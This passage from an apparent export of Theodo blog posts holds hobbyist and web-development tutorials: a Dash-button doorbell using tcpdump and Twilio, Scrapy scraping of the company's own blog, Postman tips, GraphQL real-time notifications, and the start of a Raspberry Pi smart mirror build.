above\ntcpdump is passed an interface using the -i option. en0 or eth0 will likely work for you, but use ifconfig to find you LAN ethernet interface.\nWe\u2019re piping into a while loop to get around some issues with evaluating our post grep action.\n\nWe can now trigger any action based on the pressing of the button. This could be an SMS using Twilio, an email, voice announcement using espeak, an AWS Lambda function\u2026 the world\u2019s your limit!\nMaking a doorbell\nIf we want our doorbell to drop us an SMS we can sign up for Twilio\u2019s programmable SMS service.\nThen we can adapt our script to include a curl request as follows:\n\r\n#!/bin/bash\r\nbutton='ENTER_THE_MAC_ADDRESS'\r\n\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=Let Me In! \ud83d\udeaa' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"There is someone at the door\" | say\r\n  fi\r\ndone\r\n\n\n$YOUR_ACCOUNT_ID you can get from the Twilio site.\n$YOUR_PHONE_NUMBER is the number of the phone to be texted when the doorbell is rung.\n$YOUR_TWILLIO_PHONE_NUMBER is the phone number given to you by Twilio.\n$ YOUR_TWILLIO_API_KEY you can get from the Twilio site.\n\nThe Twilio getting started console can help you build such a request body.\nDeploying to the Raspberry Pi\nPro Tip: You\u2019ll have better performance regarding latency and reliability with a direct ethernet connection to the LAN router.\nResin.io is an amazing tool when it comes to IOT provisioning. Follow my steps in the article, \u2018IOT Provisioning As A Service\u201d, I wrote the day before the hackathon on setting up a Raspberry Pi without the headache. The next steps will assume you\u2019re using resin.io with the docker image from that article.\nEdit the Dockerfile.template to install tcpdump and curl by adding the following lines:\n\r\nRUN apt-get update\r\nRUN apt-get install tcpdump curl\r\n\nNow change the run line at the bottom of the template to CMD [\u201c./main.sh\u201d] where \u201cmain.sh\u201d is the name of the script.\nWe can now git add and commit to the master branch, and git push to your remote resin repository as discussed in the article from above.\nOn the resin.io dashboard we can watch the deployment and debug any issues (e.g. the interface name eth0 or en0 is wrong for the Pi environment).\nPress the button\u2026\nAnd\u2026\nGet several notifying text messages.\nDealing with multiple notifications\nSeveral ARP requests can be received when the button is pressed due to the nature of the DHCP handshake. You can use a sleeping period to prevent such issues, but for this proof of concept the repeats are fine for now. (Keep an eye on this space)\nGetting chatty\nTaking the concept further we can connect our Raspberry Pi to a speaker and use the espeak library to trigger text to speech notifications.\nOnce again edit the Dockerfiler.template to add:\n\r\n'RUN apt-get install espeak'\r\n\nNow we can add the following to the main.sh:\n\r\n'echo \"There is someone at the door\" | espeak -v en-sc -a 200'\r\n\nCoffee time \u2615\ufe0f\nTaking the idea to another level let\u2019s build a \u201ccoffee emergency button\u201d.\nIn our office when the coffee runs out, it\u2019s a big problem\u2026\n\n\r\nNo coffee => slow devs => bad code.\r\n\nWe\u2019re going to build an internet connected coffee emergency button that will go on top of the emergency coffee tin, sending an audio alert to the office and a text message to the coffee buyer.\nTo do this we need to add another MAC address to our script for the new button and change our main.sh file as follows:\n\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=Let Me In! \ud83d\udeaa' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"There is someone at the door\" | say\r\n  fi\r\n  if echo $b | grep -q $coffee_button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=ORDER COFFEE \u2615\ufe0f\ud83d\udea8' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"POTENTIAL COFFEE EMERGENCY AVERTED, BUYER NOTIFIED.\" | say\r\n    echo \"That was a close one.\" | say\r\n  fi\r\ndone\r\n\nConclusion\nThis solution was built during a Theodo Hackathon and has room for improvement, yet it does serve as a fully functional doorbell in our office and we\u2019ve not run out of coffee since!\nHopefully you learned some networking, have ideas for your own projects and will build your own buttons.\nPlease leave your ideas and results in the comments below.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tScraping a website means extracting data from a website in a usable way.\nThe ultimate goal when scraping a website is to use the extracted data to build something else.\nIn this article, I will show you how to extract the content of all existing articles of Theodo\u2019s blog with Scrapy, an easy-to-learn, open source Python library used to do data scraping.\nI personally used this data to train a machine learning model that generates new blog articles based on all previous articles (with relative success)!\nImportant:\nBefore we start, you must remember to always read the terms and conditions of a website before you scrape it as the website may have some requirements on how you can legally use its data (usually not for commercial use).\nYou should also make sure that you are not scraping the website too aggressively (sending too many requests in a short period of time) as it may have an impact on the scraped website.\nScrapy\nScrapy is an open source and collaborative framework for extracting data from websites.\nScrapy creates new classes called Spider that define how a website will be scraped by providing the starting URLs and what to do on each crawled page.\nI invite you to read the documentation on Spiders if you want to better understand how scraping is done when using Scrapy\u2019s Spiders.\nScrapy is a Python library that is available with pip.\nTo install it, simply run pip install scrapy.\nYou are now ready to start the tutorial, let\u2019s get to it!\nExtracting all the content of our blog\nYou can find all the code used in this article in the accompanying repository.\nGet the content of a single article\nFirst, what we want to do is retrieve all the content of a single article.\nLet\u2019s create our first Spider. To do that, you can create an article_spider.py file with the following code:\nimport scrapy\r\n\r\n\r\nclass ArticleSpider(scrapy.Spider):\r\n    name = \"article\"\r\n    start_urls = ['http://blog.theodo.fr/2018/02/scrape-websites-5-minutes-scrapy']\r\n\r\n    def parse(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nLet\u2019s break everything down!\nFirst we import the scrapy library and we define a new class ArticleSpider derived from the Spider class from scrapy.\nWe define the name of our Spider and the start_urls, the URLs that our Spider will visit (in our case, only the URL of this blog post).\nFinally, we define a parse method that will be executed on each page crawled by our spider.\nIf you inspect the HTML of this page, you will see that all the content of the article is contained in a div of class entry-content.\nScrapy provides an xpath method on the response object (the content of the crawled page) that creates a Selector object useful to select parts of the page.\nIn the xpath method, it will create a Selector based on the xpath language.\nUsing this method, we find the list of the text of all the descendants (divs, spans\u2026) contained in the entry-content block.\nWe then return a dictionary with the content of the article by concatenating this list of text.\nNow, if you want to see the result of this Spider, you can run the command scrapy runspider article_spider.py -o article.json.\nWhen you run this command, Scrapy looks for a Spider definition inside the file and runs it through its crawling engine.\nThe -o flag (or --output) will put the content of our Spider in the article.json file, you can open it and see that we indeed retrieved all the content of the article!\nNavigate through all the articles of a page\nWe now know how to extract the content of an article.\nBut how can we extract the content of all articles contained on a page ?\nTo do this, we need to identify the URLs of each article and use what we learned in the previous section to extract the content of each article.\nWe could use the same Spider as the last section and give all the URLs to the start_urls attribute but that would take a lot of manual time to retrieve all the URLs.\nIn a blog page like this one, you can go to an article by clicking on the title of the article.\nWe must thus find a way to visit all of the articles by clicking on each titles.\nScrapy provides another method on the response object, the css method that also creates a Selector object, but this time based on the CSS language (which is easier to use than xpath).\nIf you inspect the title of an article, you can see that it is a link with a a tag contained in a div of class entry-title.\nSo, to extract all the links of a page, we can use the selector with response.css('.entry-title a ::attr(\"href\")').extract().\nNow let\u2019s put two and two together and create a page_spider.py file with this code:\nimport scrapy\r\n\r\n\r\nclass PageSpider(scrapy.Spider):\r\n    name = \"page\"\r\n    start_urls = ['http://blog.theodo.fr/']\r\n\r\n    def parse(self, response):\r\n        for article_url in response.css('.entry-title a ::attr(\"href\")').extract():\r\n            yield response.follow(article_url, callback=self.parse_article)\r\n\r\n    def parse_article(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nWhat our PageSpider is doing here is start on the homepage of our blog and identify the URLs of each article in the page using the css method.\nThen, we use the follow method on each URL to extract the content of each article using the parse_article callback (directly inspired from the first part).\nThe follow method allow us to do a new request and apply a callback on it, this is really useful to do a Spider that navigates through multiple pages.\nIf you run the command scrapy runspider page_spider.py -o page.json, you will see in the page.json output that we retrieved the content of each article of the homepage.\nYou may notice one of the main advantages about Scrapy: requests are scheduled and processed asynchronously.\nThis means that Scrapy doesn\u2019t need to wait for a request to be finished and processed, it can send another request or do other things in the meantime.\nNavigate through all the pages of the blog\nNow that we know how to extract the content of all articles in a page, let\u2019s extract all the content of the blog by going through all the pages of the blog.\nOn each page of the blog, at the bottom of the page, you can see an \u201cOlder posts\u201d button that links to the previous page of the blog.\nTherefore, if we want to visit all pages of the blog, we can start from the first page and click on \u201cOlder posts\u201d until we reach the last page (obviously, the last page of the blog does not contain the button).\nThe \u201cOlder posts\u201d button can be easily identified using the same css method as the previous section with response.css('.nav-previous a ::attr(\"href\")').extract_first().\nNow let\u2019s retrieve all the content of our blog with a blog_spider.py:\nimport scrapy\r\n\r\n\r\nclass BlogSpider(scrapy.Spider):\r\n    name = \"blog\"\r\n    start_urls = ['http://blog.theodo.fr/']\r\n\r\n    def parse(self, response):\r\n        for article_url in response.css('.entry-title a ::attr(\"href\")').extract():\r\n            yield response.follow(article_url, callback=self.parse_article)\r\n        older_posts = response.css('.nav-previous a ::attr(\"href\")').extract_first()\r\n        if older_posts is not None:\r\n            yield response.follow(older_posts, callback=self.parse)\r\n\r\n    def parse_article(self, response):\r\n        content = response.xpath(\".//div[@class='entry-content']/descendant::text()\").extract()\r\n        yield {'article': ''.join(content)}\r\n\nNow, our BlogSpider extracts all URLs of articles and calls the parse_article callback and then extracts the URL of the \u201cOlder posts\u201d button.\nIt then follows the URL and applies the parse callback on the previous page of our blog.\nIf you run the command scrapy runspider blog_spider.py -o blog.json, you will see that our Spider will visit every article page and retrieve the content of each article since the beginning of our blog!\nGoing further\n\nWe could have also used a CrawlSpider, another Scrapy class that provides a dedicated mechanism for following links by defining a set of rules directly in the class.\nYou can look at the documentation here.\nIn the parse_article function, we retrieved all the text content but that also includes the aside where we have the author of each article.\nTo remove it from the output, you can change the xpath by response.xpath(\".//div[@class='entry-content']/descendant::text()[not(ancestor::aside)]\").\nYou can see that the output of the scraper is not perfect as we see some unorthodox characters like \\r, \\n or \\t.\nTo exploit the data, we would first need to clean what we retrieved by removing unwanted characters.\nFor example, we could replace \\t characters to a space with a simple content.replace('\\r', ' ').\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThomas Mollard\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nA postman, or letter carrier (in American English), sometimes colloquially known as a postie, is an employee of a post office or postal service, who delivers mail and parcel post to residences and businesses. Postman is also the name of a powerful graphical HTTP client helpful when working with APIs. I\u2019ll introduce a few tricks to get started with it!\nInstallation\nTo install Postman, go to this link and download the right version for the OS you use.\nHow to do a simple GET?\nLaunching the app, you should see the following screen:\n\nClick the Request button at the top-left of the modal, and you\u2019ll get on the Save Request screen.\nGive it a name, create a collection if you don\u2019t have any, select a collection and save it.\n\nFrom there, you\u2019ll be able to send a request. For exemple, you can hit the HTTPCat API. Enter the https://http.cat/[status_code] URL in the dedicated tab, with the status code of your choice. Press Send and you\u2019ll see the response just below.\n\nA first POST with a JSON body\nTo illustrate how to do a POST request, we are going to hit the https://jsonplaceholder.typicode.com/ URL, on the post route.\nSo from the same screen, select POST instead of GET, and enter the URL in the dedicated tab.\n\nThe API we\u2019re hitting enables us to send any JSON body, and sends it back in the response, adding it an id. Let\u2019s then send a random object.\nGo in the Body tab, check the raw radio button, and make sure that you selected JSON (application/json) on the dropdown on the right.\nThe body is a JSON object. There are a couple of things we need to be careful of when we write a JSON object, especially when you are used to writing JavaScript. Check here to know the traps not to fall in.\nIn the end we obtain this kind of POST requests:\n\nJust press Send and you\u2019ll have the response!\nUseful tricks POSTMAN offers\nHow to share one\u2019s collections\nExport them\nOn the left of your window, you have a list of your collections. Go over one with your mouse cursor, and you\u2019ll see three dots on the bottom-right of it. Click them, then click Export.\n\nYou\u2019ll get on a modal that asks you to choose the way you want to download your collection. Choose Collection v2, click Export and save it.\n\nImport them\nTo import a collection, click on Import at the top-right of your window, then get in your own files the json you want to import!\n\nHow to set environnement variables\nThe typical use case here is when you work with different environments. Let\u2019s say you develop an API which has a production, a staging and a development environments. For each of them, you want to set a Host and a token variable, to be able to authenticate.\nClick the wheel on the top-right of your screen, then select Manage Environments.\n\nClick Add.\n\nYou can now give a name to your environment, and set the variables you need. Click Update when this is done.\n\nYou can do this for each one of your environments, then you\u2019ll see them\u00a0in the Manage Environments tab.\n\nNow go back to the main screen, and fill your request with the variables using double curly brackets: {{ }}.\n\nBest way to create a request: copy as curl\nLet\u2019s say you want to reproduce a request done on a website. But this request is a very tricky one with, for example, authentication, complicated headers, a big body or a method you don\u2019t really know how to use.\nThen the best way to replicate this request is to basically copy the entire request directly from your browser.\nLet\u2019s say we want to get the post request of a research on https://giphy.com/. Open the browser development tools (Right click + Inspect on Chrome). Go in the Network tab and filter the requests by POST methods. Right click the one you are interested in, and select Copy as CURL.\n\nNow, go back to POSTMAN. On the top-left, click Import, and go in the Paste Raw Text tab. Paste what you copied, and press Import.\n\nNow Send the request and you\u2019ll have the answer!\nConclusion\nIf you want to keep going with Postman, you check this article about Postman Cloud, which explains you how to share and document your API.\nAnd\u00a0actually\u00a0there were technically only\u00a04 tricks in this article.. If you find any fifth\u00a0that would fit here, send it to me and I\u2019ll add it!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tElias Tounzal\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tReal-time has opened new opportunities in web applications.\nBy allowing users to get access to data as soon as it\u2019s available, it provides them a better experience.\nThanks to real-time, you can edit documents collaboratively, play online with your friends, know exactly when your pizza delivery man will arrive or when you will arrive at destination depending of the current traffic.\nIn the past, implementing real-time had a huge cost and was reserved for top companies like Google or Facebook, but nowadays, emergence of real-time technologies and libraries makes it accessible to anyone.\nGraphQL has integrated real-time in its specification with Subscriptions. That means that you can use real-time inside the same api you use for the rest of your application, providing an unique source of communication and a better organization.\nIn this tutorial, you will see how to implement a real-time web application with few lines of codes, using GraphQL, Apollo and React.\nIn order to accomplish this goal, we will build a notification system from scratch in two parts, first we will implement a GraphQL NodeJS express server, then a web application with React.\nThe code referring to this article can be found on GitHub.\n1. The server\n1.1. Bootstrap the GraphQL server\nLet\u2019s start with the initiation of the server.\nCreate a new folder and write the following commands inside:\n\nnpm init or yarn init to generate the package.json file\nnpm install --save express body-parser apollo-server-express graphql-tools or yarn add express body-parser apollo-server-express graphql-tools to install required libraries.\n\nCreate a new file index.js:\nconst express = require('express');\r\nconst bodyParser = require('body-parser');\r\nconst { graphqlExpress, graphiqlExpress } = require('apollo-server-express');\r\nconst { makeExecutableSchema } = require('graphql-tools');\r\n\r\nconst notifications = [];\r\nconst typeDefs = `\r\n  type Query { notifications: [Notification] }\r\n  type Notification { label: String }\r\n`;\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n};\r\nconst schema = makeExecutableSchema({ typeDefs, resolvers });\r\n\r\nconst app = express();\r\napp.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));\r\napp.use('/graphiql', graphiqlExpress({ endpointURL: '/graphql' }));\r\napp.listen(4000, () => {\r\n  console.log('Go to http://localhost:4000/graphiql to run queries!');\r\n});\r\n\nCongratulations, you have just created a GraphQL server with Express and Apollo!\nYou can launch it with the command: node index.js.\nIn this server, we added a GraphQL query named notifications that allows us to get all notifications.\nYou can test it with GraphiQL, by going to the adress http://localhost:4000/graphiql and sending the following query (it should return an empty array because there is no notifications available yet):\nquery {\r\n  notifications {\r\n    label\r\n  }\r\n}\r\n\nThe corresponding commit is available here.\n1.2. Add a mutation to the server\nNext, let\u2019s add a mutation that will allow you to push notifications.\nUpdate type definitions and resolvers in index.js:\n...\r\nconst typeDefs = `\r\n  type Query { notifications: [Notification] }\r\n  type Notification { label: String }\r\n  type Mutation { pushNotification(label: String!): Notification }\r\n`;\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n  Mutation: {\r\n      pushNotification: (root, args) => {\r\n        const newNotification = { label: args.label };\r\n        notifications.push(newNotification);\r\n\r\n        return newNotification;\r\n      },\r\n  },\r\n};\r\n...\r\n\nThe pushNotification mutation is ready. You can test it in GraphiQL, with:\nmutation {\r\n  pushNotification(label:\"My first notification\") {\r\n    label\r\n  }\r\n}\r\n\nClick here for the commit.\n1.3. Add subscriptions\nThe last step in the building of the server is adding the subscription, to make our server going to real-time.\nAdd the required libraries to use subscriptions: npm install --save graphql-subscriptions http subscriptions-transport-ws cors or yarn add graphql-subscriptions http subscriptions-transport-ws cors\nThen add the subscription newNotification in the GraphQL schema:\nconst { PubSub } = require('graphql-subscriptions');\r\n\r\nconst pubsub = new PubSub();\r\nconst NOTIFICATION_SUBSCRIPTION_TOPIC = 'newNotifications';\r\n...\r\n  type Mutation { pushNotification(label: String!): Notification }\r\n  type Subscription { newNotification: Notification }\r\n...\r\nconst resolvers = {\r\n  Query: { notifications: () => notifications },\r\n  Mutation: {\r\n      pushNotification: (root, args) => {\r\n        const newNotification = { label: args.label };\r\n        notifications.push(newNotification);\r\n\r\n        pubsub.publish(NOTIFICATION_SUBSCRIPTION_TOPIC, { newNotification });\r\n        return newNotification;\r\n      },\r\n  },\r\n  Subscription: {\r\n    newNotification: {\r\n      subscribe: () => pubsub.asyncIterator(NOTIFICATION_SUBSCRIPTION_TOPIC)\r\n    }\r\n  },\r\n};\r\nconst schema = makeExecutableSchema({ typeDefs, resolvers });\r\n\n\nDeclare a PubSub and a topic corresponding to the new Subscription\nDeclare the type definition of the new Subscription called newNotification\nEvery time a new notification is sent via the pushNotification mutation, publish to PubSub with the relevant topic\nSync the new notification Subscription with all events from PubSub instance corresponding to relevant topic\n\nFinally, update the server configuration to provide Subscriptions via WebSockets.\nconst cors = require('cors');\r\nconst { execute, subscribe } = require('graphql');\r\nconst { createServer } = require('http');\r\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\r\n...\r\nconst app = express();\r\napp.use('*', cors({ origin: `http://localhost:3000` })); // allows request from webapp\r\napp.use('/graphql', bodyParser.json(), graphqlExpress({ schema }));\r\napp.use('/graphiql', graphiqlExpress({\r\n  endpointURL: '/graphql',\r\n  subscriptionsEndpoint: `ws://localhost:4000/subscriptions`\r\n}));\r\nconst ws = createServer(app);\r\nws.listen(4000, () => {\r\n  console.log('Go to http://localhost:4000/graphiql to run queries!');\r\n\r\n  new SubscriptionServer({\r\n    execute,\r\n    subscribe,\r\n    schema\r\n  }, {\r\n    server: ws,\r\n    path: '/subscriptions',\r\n  });\r\n});\r\n\nThe server is ready, you can test the new Subscription with GraphiQL.\nUse the following query to display new notifications on a windows.\nsubscription {\r\n  newNotification {\r\n    label\r\n  }\r\n}\r\n\nAnd in another windows, if you push notifications via the mutation created before, you should see data from the subscription being updated.\n\nYou can find the relevant commit here\n2. The React web application\n2.1. Bootstrap the React app\nBootstrap the front-end application with Create React App:\nnpx create-react-app frontend\nCorresponding commit here\n2.2. Add mutation to push notifications\nNext, we will set up Apollo Client to communicate with the GraphQL server.\nInstall the required libraries: npm install --save apollo-boost react-apollo graphql or yarn add apollo-boost react-apollo graphql\nUpdate index.js\n...\r\nimport { ApolloProvider } from 'react-apollo'\r\nimport { ApolloClient } from 'apollo-client'\r\nimport { HttpLink } from 'apollo-link-http'\r\nimport { InMemoryCache } from 'apollo-cache-inmemory'\r\n\r\nconst client = new ApolloClient({\r\n  link: new HttpLink({ uri: 'http://localhost:4000/graphql' }),\r\n  cache: new InMemoryCache()\r\n})\r\n\r\nReactDOM.render(\r\n  <ApolloProvider client={client}>\r\n    <App />\r\n  </ApolloProvider>,\r\n  document.getElementById('root')\r\n);\r\n\nThen create a new component PushNotification that will be used to send pushNotification mutation.\nPushNotification.js\nimport React, { Component } from 'react'\r\nimport { graphql } from 'react-apollo'\r\nimport gql from 'graphql-tag'\r\n\r\nclass PushNotification extends Component {\r\n  state = { label: '' }\r\n\r\n  render() {\r\n    return (\r\n      <div>\r\n        <input\r\n          value={this.state.label}\r\n          onChange={e => this.setState({ label: e.target.value })}\r\n          type=\"text\"\r\n          placeholder=\"A label\"\r\n        />\r\n        <button onClick={() => this._pushNotification()}>Submit</button>\r\n      </div>\r\n    )\r\n  }\r\n\r\n  _pushNotification = async () => {\r\n    const { label } = this.state\r\n    await this.props.pushNotificationMutation({\r\n      variables: {\r\n        label\r\n      }\r\n    })\r\n    this.setState({ label: '' });\r\n  }\r\n}\r\n\r\nconst POST_MUTATION = gql`\r\nmutation PushNotificationMutation($label: String!){\r\n  pushNotification(label: $label) {\r\n    label\r\n  }\r\n}\r\n`\r\n\r\nexport default graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification)\r\n\n\nAs the component is wrapped by graphql(POST_MUTATION, { name: 'pushNotificationMutation' })(PushNotification), this component has a prop pushNotification that can be used to call the mutation.\n\nThen call PushNotification in AppComponent\nimport PushNotification from 'PushNotification'\r\n...\r\n  <div className=\"App-intro\">\r\n    <PushNotification/>\r\n  </div>\r\n...\r\n\nWe can now push notifications from the React application! We can check that notifications are sent to the server with GraphiQL.\nCorresponding commit is here\n2.3. Add subscription to get real-time notifications\nThe last step is allowing subscriptions in the React application.\nInstall the required dependencies: npm install --save apollo-link-ws react-toastify or yarn add apollo-link-ws react-toastify.\n\napollo-link-ws enables to send GraphQL operation over WebSockets.\nReact Toastify will be used to push toasts when a notification is received\n\nThen update Apollo Client configuration to use WebSockets\nindex.js\n...\r\nimport { split } from 'apollo-link';\r\nimport { WebSocketLink } from 'apollo-link-ws';\r\nimport { getMainDefinition } from 'apollo-utilities';\r\n\r\nconst httpLink = new HttpLink({ uri: 'http://localhost:4000/graphql' });\r\n\r\nconst wsLink = new WebSocketLink({\r\n  uri: `ws://localhost:4000/subscriptions`,\r\n  options: {\r\n    reconnect: true\r\n  }\r\n});\r\n\r\nconst link = split(\r\n  ({ query }) => {\r\n    const { kind, operation } = getMainDefinition(query);\r\n    return kind === 'OperationDefinition' && operation === 'subscription';\r\n  },\r\n  wsLink,\r\n  httpLink,\r\n);\r\n\r\nconst client = new ApolloClient({\r\n  link,\r\n  cache: new InMemoryCache()\r\n})\r\n...\r\n\nAnd wrap the main App component with the query corresponding to the subscription.\nimport { graphql } from 'react-apollo'\r\nimport gql from 'graphql-tag'\r\nimport { ToastContainer, toast } from 'react-toastify';\r\n\r\nclass App extends Component {\r\n  componentWillReceiveProps({ data: { newNotification: { label } } }) {\r\n    toast(label);\r\n  }\r\n  render() {\r\n    return (\r\n      <div className=\"App\">\r\n        ...\r\n        <ToastContainer />\r\n      </div>\r\n    );\r\n  }\r\n}\r\n\r\nconst subNewNotification = gql`\r\n  subscription {\r\n    newNotification {\r\n      label\r\n    }\r\n  }\r\n`;\r\n\r\nexport default graphql(subNewNotification)(App);\r\n\n\nWhen a component is wrapped with a Subscription, it automatically receives data from the subscription in its props.\nAnother method to receive data from Subscription is using subscribeToMore. This useful method merges the different received objects in your component state with other objects from classic GraphQL queries.\n\nThe notification system is now finished!\n\nFinal commit here\nConclusion\nDuring this tutorial, we learnt how to build a real-time notification system from scratch with GraphQL, Apollo and express.\nThe current system is basic, next step could be adding authentification to push notification only to a specific user.\nTo go further, I highly recommend:\n\nHow to GraphQL\nApollo Docs\n\nDon\u2019t hesitate to give feedback, or share your experiences with real-time GraphQL in comments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLo\u00efc Carbonne\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSmart mirrors are straight from science fiction but it turns out that building your own smart mirror isnt just science fiction or Tom Cruise\u2019s favorite activity. Its actually easy to build your own version\u2026 and I will show you how.\nI recently built one to save time each morning by answering this question:\nShould I check for a bike for hire or take the subway?\nThus, I wanted to have several pieces of information instantly such as weather conditions or the number of available bikes around my house.\n\nSupplies\nHere\u2019s what you need:\n\nARaspberry Pi Zero W, or another Raspberry version with Wifi option (10\u20ac)\nA monitor with HDMI-in, I have chosen an old laptop LCD screen (free)\nLCD driver board (19\u20ac)\nA two-way glass mirror\u00a0(20\u20ac)\nA frame for the mirror,\u00a0\u00a0I found an old one in\u00a0my garage (free)\n\nBuilding your smart mirror is surprisingly easy\nA smart mirror consists basically of a mirror with a screen attached to it that displays a static web page filled with all the data you want to show.\u00a0\n\n\n(source:\u00a0https://magicmirror.builders/)\nOne of the most expensive parts of building a smart mirror can be shelling out for a nice two-way mirror. Therefore, a lot of people have been experimenting with building a smart mirror with two-way mirror film on top of regular glass/plastic instead of actual two-way glass, as I did.\n\nRaspberry configuration\nOnce you put all the parts together, you will have to set up your Raspberry Pi:\nInstall Raspbian Jessie OS\nYou can follow this tutorial here:\nhttp://blog.theodo.fr/2017/03/getting-started-headless-on-raspberry-pi-in-10-minutes/\nInstall Chromium\nSince Chromium Web Browser is not available for Raspbian Jessie installed on the ARMv6 RPi models, you can try kweb browser or the custom version of Chromium:\n\r\nwget -qO - http://bintray.com/user/downloadSubjectPublicKey?username=bintray | sudo apt-key add -\r\necho \"deb http://dl.bintray.com/kusti8/chromium-rpi jessie main dev\" | sudo tee -a /etc/apt/sources.list\r\nsudo apt-get update\r\nsudo apt-get install chromium-browser rpi-youtube -y\r\n\nNow, you can display your single page app with:\n\r\nchromium --kiosk https://my.mirror.io\r\n\nFetching data\nSo, lets go back to initial need: display some useful data to help me choose the best transport option! Let\u2019s go into fetching data:\nMy React app is composed of 3 components: Weather, Bikes & Metro which fetch data from the following APIs. You can followthis tutorialto do so, I also usedAxiosnpm module to fetch data.\nFirst of all, I useApixu APIto collect weather information:\nhttps://api.apixu.com/v1/forecast.json?key=token&q=Paris\nwhich gives us current weather and forecast:\n\r\n{\r\n  \"location\": {\r\n    \"name\": \"Paris\",\r\n    \"region\": \"Ile-de-France\",\r\n    \"country\": \"France\",\r\n    \"lat\": 48.87,\r\n    \"lon\": 2.33,\r\n    \"tz_id\": \"Europe/Paris\",\r\n    \"localtime_epoch\": 1515503800,\r\n    \"localtime\": \"2018-01-09 14:16\"\r\n  },\r\n  \"current\": {\r\n    \"last_updated_epoch\": 1515502814,\r\n    \"last_updated\": \"2018-01-09 14:00\",\r\n    \"temp_c\": 6.0,\r\n    \"temp_f\": 42.8,\r\n    \"is_day\": 1\r\n  },\r\n  \"forecast\": {\r\n    \"temp_min_c\": 4.0,\r\n    \"temp_max_c\": 8.2,\r\n    \"condition\": \"cloudy\"\r\n  }\r\n}\r\n\nFor metro data, I preferred this non-official REST API:\nhttps://api-ratp.pierre-grimaud.fr/v3/schedules/metros/13/guy+moquet/R?_format=json\n\r\n\"result\": {\r\n  \"schedules\": [\r\n    {\r\n      \"message\": \"3 mn\",\r\n      \"destination\": \"Chatillon Montrouge\"\r\n    },\r\n    {\r\n      \"message\": \"9 mn\",\r\n      \"destination\": \"Chatillon Montrouge\"\r\n    }\r\n  ]\r\n}\r\n\nLast but not least, I wanted to display how many bikes 